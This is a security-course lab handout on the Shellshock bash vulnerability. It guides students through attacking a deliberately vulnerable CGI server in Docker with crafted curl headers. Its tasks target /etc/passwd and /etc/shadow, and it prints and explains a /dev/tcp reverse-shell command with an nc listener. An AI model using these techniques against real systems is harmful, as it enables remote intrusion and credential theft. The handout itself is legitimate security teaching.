Adapted from SEED Labs: A Hands-on Lab for Security Education.
{:.subtitletext}

On September 24, 2014, a severe vulnerability in bash was identified.
Nicknamed _Shellshock_, this vulnerability can exploit many systems and be launched either remotely or from a local machine.
In this lab, students will work on this attack to better understand the Shellshock vulnerability.
The learning objective of this lab is for students to get first-hand experience with this interesting attack,
understand how it works, and think about more general lessons that we can take aware from this attack.
The first version of this lab was developed on September 29, 2014, just five days after the attack was reported.
<!-- It was assigned to the students in our Computer Security class on September 30, 2014.  -->
<!-- An important mission of the SEED project is to quickly turn real attacks into educational materials,  -->
<!-- so instructors can bring them into their classrooms in a timely manner and keep their students engaged with what happens in the real world. -->

This lab covers the following topics:

-   Shellshock
-   Environment variables
-   Function definitions in bash
-   Apache and CGI programs

<!-- {:.titletext} -->
<!-- This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM). -->
<!-- {:.subtitletext} -->

## Environment Setup

This lab uses a new approach that is dependent on docker/containers.
The transition to containers was meant to make the setup for this lab easier.
(Old versions of network and web security labs required multiple VMs - containers are much more lightweight and easy to work with.)
If, however, you encounter any issues, please let me know, and we can work to troubleshoot.
Please follow the rest of this section _**very carefully**_ - it contains critical information to ensure that this lab will work properly.

For reference, here is a link to the official [SEED Manual for Containers](https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md).

> If this is the first time you set up a SEED lab environment using containers, it is quite important that you read the user manual.

### Container Setup and Commands

Please ensure that you have the class repo cloned locally.
Once this is done, navigate to `02_shellshock/` directory.

```bash
$ git clone https://github.com/traviswpeters/cs476-code.git code # name the local clone 'code'
$ cd /home/seed/code/02_shellshock
```

We will make use of [**Docker**](https://www.docker.com/resources/what-container) and [**Compose**](https://docs.docker.com/compose/) to make working with containers easy.

```bash
# First, build the container
$ docker-compose build    # Build the container image

# Next, start/stop the container(s) as needed
$ docker-compose up -d    # Start the container (-d runs container in the background; i.e., detached)
$ docker-compose down     # Shut down the container
```

<!-- Please download the `Labsetup.zip` file to your VM from the lab's website, unzip it, enter the `Labsetup` folder, and use the `docker-compose.yml` file to set up the lab environment. -->
<!-- Detailed explanation of the content in this file and all the involved `Dockerfile` can be found from the user manual, which is linked to the website of this lab.  -->
<!-- If this is the first time you set up a SEED lab environment using containers, it is very important that you read the user manual. -->

<!-- In the following, we list some of the commonly used commands related to Docker and Compose. -->
<!-- Since we are going to use these commands frequently, we have created aliases for them in the `.bashrc` file within the official SEEDUbuntu 20.04 VM. -->
<!--
```
$ docker-compose build  # Build the container image
$ docker-compose up     # Start the container
$ docker-compose down   # Shut down the container

// Aliases for the Compose commands above
$ dcbuild       # Alias for: docker-compose build
$ dcup          # Alias for: docker-compose up
$ dcdown        # Alias for: docker-compose down
```
 -->
<!--
All the containers will be running in the background.
To run commands on a container, we often need to get a shell on that container.
We first need to use the `docker ps` command to find out the ID of the container,
and then use `docker exec` to start a shell on that container.
We have created aliases for them in the `.bashrc` file.
-->

In general for our labs, we will create and start containers that will run in the background
(i.e., use the `-d` flag when bringing your container up).

At times we may need to run commands on a container --- docker makes it pretty easy to attach to a container running in the background and get a shell on that container.
To run commands on a specific container, we first need to use the `docker ps` command to find out the ID of the container,
and then we can use `docker exec` to start a shell on that container.
_(I told you this would be easy!)_

```bash
$ docker ps -a   # Show all containers (default shows just running)
$ dockps         # Show active containers using custom formatting for docker ps
$ docksh <id>    # Connect to container with <id>

### Examples ###

# The following example shows how to get a shell inside hostC
$ dockps
b1004832e275  hostA-10.9.0.5
0af4ea7a3e2e  hostB-10.9.0.6
9652715c8e0a  hostC-10.9.0.7

# Attach to docker with ID that starts with "96"
$ docksh 96
root@9652715c8e0a:/#  

# NOTE: If a docker command requires a container ID, you do not need to type the entire ID string.
# Typing the first few characters will be sufficient so long as it can uniquely identify a container.
```


**Docker/Compose Aliases.**
For convenience we provide a number of aliases for the commands above.
Feel free to use them (or don't).
```bash
### see docker aliases ###
$ cat ~/.bashrc | grep docker
```
**Troubleshooting.**
If you encounter problems when setting up the lab environment,
please read the **"Common Problems"** section of the [SEED Manual for Containers](https://github.com/seed-labs/seed-labs/blob/master/manuals/docker/SEEDManual-Container.md) for potential solutions.
If you still can't get things figured out, please connect a member of the course staff.

### DNS Settings

> **NOTE:** In our setup, the web server container's IP address is `10.9.0.80`.
> The hostname of the server is called `www.seedlab-shellshock.com`.
> We need to map this name to the IP address.
> Please add the following to the end of the `/etc/hosts` on your SEED VM.
> (You need root privileges to modify this file.)

This step should already be done, but please verify that your `/etc/hosts` file has this line:

```
10.9.0.80   www.seedlab-shellshock.com
```

### Web Server and CGI

In this lab, we will carry out various Shellshock attacks targeted at the web server container.
Many web servers enable CGI, which is a standard method used to generate dynamic content on web pages and for web applications.
Many CGI programs are shell scripts, so before the actual CGI program runs, a shell program will be invoked first, and such an invocation is triggered by users from remote computers.
If the shell program is a vulnerable bash program, we can exploit the Shellshock vulnerability to gain privileges on the server.

In our web server container, we have already set up a very simple CGI program (called `vul.cgi`).
It simply prints out "Hello World" using a shell script.
The CGI program is located inside Apache's default CGI folder `/usr/lib/cgi-bin`.
_(**NOTE:** CGI scripts must be executable.)_

<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fimage_www%2Fvul.cgi&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>

The CGI program uses `/bin/bash_shellshock` (note the first line), instead of using `/bin/bash`.
(`/bin/bash_shellshock` is just an older version of bash that has been intentionally installed in our SEED environment for this lab. As the name suggests, this version of bash is still vulnerable to Shellshock attacks.)
The first line in shell scripts is known as a [shebang](https://en.wikipedia.org/wiki/Shebang_(Unix)); this line specifies what shell program should be invoked to run the script.
In order to carry out Shellshock attacks, we need to use the vulnerable version of bash in this lab.

**CGI Test.**
Before getting started with the lab tasks, make sure that you can access this CGI script.
Before you try this, _make sure that the web server container is running!_ ;-)

There are two main approaches to access the CGI program running on our web server:
1. We can use a web browser (within the VM) and access the following URL: <http://www.seedlab-shellshock.com/cgi-bin/vul.cgi>
2. We can use the command line program `curl`:
    ```bash
    $ curl http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
    ```

## Lab Tasks
{:.titletext}
This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM).
{:.subtitletext}

<!-- Detailed guidelines on the Shellshock attack can be found in the SEED book, so we will not repeat the guidelines in the lab description. -->

### Task 1: Experimenting with Bash Functions

The bash program in Ubuntu 20.04 has already been patched, so it is no longer vulnerable to the Shellshock attack.

For the purpose of this lab, we have installed a vulnerable version of bash inside the container (see `/bin/bash_shellshock`).
<!-- The program can also be found in the `Labsetup` folder (inside `image_www`).  -->
<!-- Its name is `bash_shellshock`.  -->
<!-- Throughout this lab, we need to use this version of bash (unless otherwise stated). -->
<!-- You can run this shell program either in the container or directly on your computer.  -->
<!-- The container manual is linked to the lab's website. -->

Please design an experiment to verify whether `/bin/bash_shellshock` is vulnerable to the Shellshock attack.
Conduct the same experiment on the patched version `/bin/bash` and report your observations.

> **NOTE:** For this experiment, you can use `docksh <id>` to attach to your container.
  Once you have a shell within the terminal, you can create a child shell that runs either `/bin/bash` or `/bin/bash_shellshock` to conduct your experiment.
  In later tasks you will conduct shellshock attacks from outside the web server container, but for this task it is OK to do this within the container.

### Task 2: Passing Data to Bash via Environment Variables

To exploit a Shellshock vulnerability in a bash-based CGI program, attackers need to pass their data to the vulnerable bash program, and the data needs to be passed via an environment variable.
In this task, we need to see how we can achieve this goal.
We have provided another CGI program (`getenv.cgi`) on the server to help you identify what user data is translated into environment variables, which are ultimately passed to a CGI program.
This CGI program prints out all its environment variables for the current process.

<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fimage_www%2Fgetenv.cgi&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>

#### Task 2.1: Passing Data via the Browser

Please use your browser to access the following URL from within your VM:
[http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi](http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi).

In the code above, line 6 prints out the contents of all the environment variables in the current process.
Normally, you would see something like the output below if you use a browser to access the CGI program.
Please identify which of the environment variable(s)' values are set according to data sent from the browser.
You can turn on the [HTTP Header Live extension on your browser](https://www.techwalla.com/articles/how-to-use-live-http-headers) to capture the HTTP request,
and compare the request with the environment variables printed out by the server.
Please include your investigation results in your lab report.

```
****** Environment Variables ******
HTTP_HOST=www.seedlab-shellshock.com
HTTP_USER_AGENT=Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) ...
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9, ...
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT_ENCODING=gzip, deflate
...
```

#### Task 2.2: Passing Data via `curl`

If we want to set the environment variable data on the server to arbitrary values,
we could modify the behavior of the browser so that we can control the HTTP request data... but that sounds like a lot of work...
Fortunately there is an easier way!
There is a command-line tool called `curl`, which allows users to set/control many of the fields in an HTTP request.

Some of the useful options for `curl`:
1. the `-v` option will print verbose information about the header of the HTTP request/response;
2. the `-A`, `-e`, and `-H` options can be used to set specific fields in the header request; you need to figure out what fields are set by each of these options (see below).

Please run the commands below (Tasks 2.2.1-2.2.4) and include your findings in your lab report.
Specifically, please briefly describe what each option does, and provide relevant evidence (e.g., a snippet of output from the HTTP request/response).

##### Task 2.2.1: The `-v` option

```
$ curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```

##### Task 2.2.2: The `-A` option

```
$ curl -A "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```

##### Task 2.2.3: The `-e` option

```
$ curl -e "my data" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```

##### Task 2.2.4: The `-H` option

```
$ curl -H "AAAAAA: BBBBBB" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```

##### Task 2.2.5: Developing an Initial Attack Strategy

After completing tasks 2.2.1-2.2.4, please describe which options of `curl` could be used to inject data into the environment variables of the target CGI program.

### Task 3: Launching the Shellshock Attack

We can now launch the Shellshock attack.
The attack does not depend on what is in the CGI program, as it targets the bash program, which is invoked before the actual CGI script is executed.
You should launch your attack targeting the CGI script located at the following URL: <http://www.seedlab-shellshock.com/cgi-bin/vul.cgi>.
_**Your ultimate objective is to get the server to run an arbitrary command of your choosing.**_

In this task, you are required to use three different `curl` options (i.e., three different HTTP header fields) to launch the Shellshock attack against the target CGI program.

Each of the following subtasks (3.1-3.6) explicitly identifies your objective.

For each objective, please report:
1. A summary of your approach, with relevant command inputs/outputs
2. The `curl` option you used
3. The result (i.e., was your attack successful? Why or why not? Other observations?)

Note that for each of the following subtasks you only need to use one of the `curl` options in your attack, but in total, you need to use three different `curl` options.

#### CGI Scripts & Returning Plaintext Output

In this lab we target [Common Gateway Interface (CGI) scripts](https://en.wikipedia.org/wiki/Common_Gateway_Interface)
that use a vulnerable version of bash to generate and return dynamic content from the webserver (e.g., output from the script or another command).
While it is helpful to be familiar with the CGI, we can get by with just a few insights.

One important note: If your command has a plaintext output, and you want the output returned to you, your output needs to follow a specific format/protocol.
Most importantly, the returned output must be preceded with a blank line.
For example, if you want the server to return a list of files in its folder, your command could be structured like this:

```bash
echo; /bin/ls -l
```

It turns out that you can also include a [[media]](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) [[type]](https://en.wikipedia.org/wiki/Media_type)
by setting the `Content-Type` field to explicitly state the format of the output that follows
(e.g., `Content-Type: text/plain` indicates that the output is plaintext), which should be followed by an empty line, and then your output.
For example, see the `getenv.cgi` script, which adheres to this format when returning plaintext output consisting of the environment variables.

#### Using Absolute Paths for Commands in Payloads

You must use absolute paths in the payload of your Shellshock attack.
An exception to this is calling `echo` because that is (also) a built-in function in bash.
_Why do you need to use absolute paths for commands?_
Because the `PATH` environment variable is not actually set in the shell that gets launched!
You can verify that `PATH` is not set for the shell that your commands run inside by executing `/bin/env` as the payload of a Shellshock attack.

Example:
```bash
# this will NOT work!
echo; ls -l

# this will work!
echo; /bin/ls -l
```

</div>
</div>
<!-- END Special Section -->

#### Task 3.1: Shellshock & Reading A File

Get the server to send back the content of the `/etc/passwd` file.

#### Task 3.2: Shellshock & Process Info

Get the server to tell you its process' user ID. You can use the `/bin/id` command to print out the ID information.

#### Task 3.3: Shellshock & Creating A File

Get the server to create a file inside the `/tmp` folder.

You will either need to get into the container to verify whether the file was actually created, or use another Shellshock attack to list the contents of the `/tmp` folder.

#### Task 3.4: Shellshock & Deleting A File

Get the server to delete the file that you just created inside the `/tmp` folder.

#### Task 3.5: Shellshock & Reading A Privileged File

(Try) to "steal" the shadow file `/etc/shadow` from the server.

If you got it to work, how did you do it?!

If you couldn't get it to work, why not?

> **Hint:** Really think about it! Should you be able to steal the contents of the shadow file `/etc/shadow` from the server? Why or why not?

> **Hint:** The information obtained in Task 3.2 could give you a clue...

#### Task 3.6: Shellshock via Query Parameters (Graduate Credit)

HTTP GET requests typically include data directly in the URL, just after the `?` (the question mark symbol).
This could be another approach that we can use to launch an attack.
In the following example, we included some data in the URL, and we found that this data was used to set the following environment variable:

```
$ curl "http://www.seedlab-shellshock.com/cgi-bin/getenv.cgi?MYPARAMDATATEST"
...
QUERY_STRING=MYPARAMDATATEST
...
```

Can we use this method to launch a Shellshock attack?
Please describe your approach, conduct an experiment, and describe your conclusions based on your results.

> **Hint:** This is intended to be more of an open-ended exploration. You may find this to be trickier than it first appears.
> You'll likely want to be familiar with [URL encoding](https://en.wikipedia.org/wiki/Percent-encoding) and the challenges this may pose.

### Task 4: Getting a Reverse Shell via Shellshock

The Shellshock vulnerability allows attacks to run arbitrary commands on
the target machine. In real attacks, instead of hard-coding the command
in the attack, attackers often choose to run a shell command, so they
can use this shell to run other commands, for as long as the shell
program is alive. To achieve this goal, attackers need to run a reverse
shell.

A reverse shell is a shell process started on a machine, with its input
and output being controlled by somebody from a remote computer.
Basically, the shell runs on the victim's machine, but it takes input
from the attacker machine and also prints its output on the attacker's machine.
A reverse shell gives an attacker a convenient way to run commands on a compromised machine.

In this task, _**you need to demonstrate that you can get a reverse shell**_ from the victim (the web server) back to the attacker's machine using the Shellshock attack.

To help you, we summarize some of the major ideas below.

> This example is instructive, but for your attack you need to keep in mind that **the victim is the web server container**, and **the attacker is your SEED VM**.

<!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
<div class="card bg-secondary border-primary" markdown="1">
<div class="card-body" markdown="1">
<h4 class="card-title">Creating A Reverse Shell</h4>

The key idea of a reverse shell is to redirect its standard input, output, and error devices to a network connection,
so the shell gets its input from the connection, and prints out its output to the connection as well.
At the other end of the connection is a program run by the attacker;
the program simply displays whatever comes from the shell at the other end,
and sends whatever is typed by the attacker to the shell, over the network connection.

A commonly used program by attackers is `netcat`, which,
if running with the `-l` option, becomes a TCP server that listens for a connection on the specified port.
This server program basically prints out whatever is sent by the client, and sends to the client whatever is typed by the user running the server.
In the following experiment, `netcat` (`nc` for short) is used to listen for a connection on port `9090` (let us focus only on the first line).

```bash
Attacker(10.0.2.6):$ nc -nvl 9090     # Waiting for reverse shell
Listening on 0.0.0.0 9090
Connection received on 10.0.2.5 39452
Server(10.0.2.5):$                    # <-- Reverse shell from 10.0.2.5.
Server(10.0.2.5):$ ifconfig
ifconfig
enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.5  netmask 255.255.255.0  broadcast 10.0.2.255
        ...
```

The above `nc` command will block, waiting for a connection.

We now open a separate terminal and directly run the following bash program on the server machine (`10.0.2.5` in this example)
to emulate what attackers would run after compromising the server via the Shellshock attack.
This bash command will trigger a TCP connection to the attacker machine's port 9090, and a reverse shell will be created.
We can see the shell prompt from the above result, indicating that the shell is running on the Server machine;
we can type the `ifconfig` command to verify that the IP address is indeed `10.0.2.5`, the one belonging to the Server machine.
Here is the bash command:

```bash
Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
```

The above command is representative of one that would normally be executed on a compromised server.
It can be quite complicated to read terse commands such as these; we provide a detailed explanation below:
-   `/bin/bash -i`:
    The option `i` stands for interactive, meaning that the shell must be interactive (must provide a shell prompt).
-   `> /dev/tcp/10.0.2.6/9090`:
    This causes the output device (`stdout`) of the shell to be redirected to the TCP connection to `10.0.2.6`'s port `9090`.
    In `Unix` systems, `stdout`'s file descriptor is `1`.
-   `0<&1`:
    File descriptor `0` represents the standard input device (`stdin`).
    This option tells the system to use the standard output device as the standard input device.
    Since `stdout` is already redirected to the TCP connection,
    this option basically indicates that the shell program will get its input from the same TCP connection.
-   `2>&1`: File descriptor `2` represents standard error (`stderr`).
    This causes the error output to be redirected to `stdout`, which is the TCP connection.

**In summary**, the command
```
/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
```
starts a `bash` shell on the server machine, with its input coming from a TCP connection, and output going to the same TCP connection.
In our experiment, when the `bash` shell command is executed on `10.0.2.5`, it connects back to the `netcat` process started on `10.0.2.6`.
This is confirmed via the `Connection from 10.0.2.5 ...` message displayed by `netcat`.

### Task 5: Using the Patched Bash

Now, let us use a version of the bash program that has already been patched.
The program `/bin/bash` is a patched version.

Please replace the first line of the CGI programs with this program to have your CGI programs used the patched version of bash.

Repeat Task 3 and describe your observations.

> **NOTE:** You will need to modify the CGI script on the victim web server to use `/bin/bash` instead of `/bin/bash_shellshock`.

### Task 6: Attacking Set-UID Programs via Shellshock (Graduate Credit)

Leveraging what you learned in Lab 01 and Lab 02, design an experiment to exploit a root-owned set-uid program via a Shellshock attack.

Please use the following code from our course repository as the target of your attack.

<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F02_shellshock%2Fimage_www%2Fvul.c&style=github&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>

Please explain your setup, attack strategy, and observed outcome.
